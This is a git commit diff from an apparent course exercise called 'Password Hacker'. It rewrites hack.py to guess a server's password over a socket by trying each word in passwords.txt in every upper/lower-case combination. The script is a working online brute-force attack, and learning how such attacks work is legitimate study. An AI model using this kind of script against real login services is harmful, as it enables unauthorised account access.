a6b785eb097738c784c693ed98ceb23652d07015
akocur <akocur@yandex.ru>
2020-09-17 19:26:16 +0300

    Project: Password Hacker. Stage 3/5: Smarter, dictionary-based brute force. Completed full.

--- Password Hacker/Password Hacker/task/hacking/hack.py
+++ Password Hacker/Password Hacker/task/hacking/hack.py
@@ -18,15 +18,22 @@ def main():
             client_socket.send(args.message.encode())
             answer = client_socket.recv(1024).decode()
         if answer == 'Wrong password!':
-            passwords = brute_force_passwords(string.ascii_lowercase + string.digits)
-            while answer != 'Connection success!':
-                password = next(passwords)
+            for password in dictionary_based_brute_force_passwords():
                 client_socket.send(password.encode())
                 answer = client_socket.recv(1024).decode()
-            print(password)
+                if answer == 'Connection success!':
+                    print(password)
+                    break
 
 
-def brute_force_passwords(available_characters):
+def dictionary_based_brute_force_passwords():
+    with open('passwords.txt') as f:
+        for password in f:
+            for combination in itertools.product(*((ch.upper(), ch.lower()) for ch in password.strip())):
+                yield ''.join(combination)
+
+
+def brute_force_passwords(available_characters=string.ascii_lowercase + string.digits):
     for r in range(1, len(available_characters)):
         for combination in itertools.product(available_characters, repeat=r):
             yield ''.join(combination)
